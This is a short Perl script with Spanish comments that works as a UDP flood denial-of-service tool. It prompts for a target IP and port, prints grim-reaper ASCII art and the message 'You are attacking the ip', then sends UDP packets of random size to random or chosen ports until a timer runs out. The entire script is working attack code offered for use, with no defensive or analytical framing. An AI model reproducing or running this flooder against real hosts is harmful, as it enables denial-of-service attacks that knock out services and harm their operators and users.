#!/usr/bin/perl

use Socket;
use strict;

# Solicitar la IP y el puerto al usuario
print "Ingresa la IP de destino: ";
chomp(my $ip = <STDIN>);
print "Ingresa el puerto de destino (deja en blanco para aleatorio): ";
chomp(my $port = <STDIN>);

# Mantener el comportamiento original para size y time
my ($size, $time) = @ARGV;

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;



                   ...
                 ;::::; 
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\\
           ::::::;       ;          OOOOO\\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
EOTEXT

print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .
($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
($time ? "for $time seconds" : "") . "\n";

for (;time() <= $endtime;) {
    $psize = $size ? $size : int(rand(1024-64)+64) ;
    $pport = $port ? $port : int(rand(65500))+1;
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
}
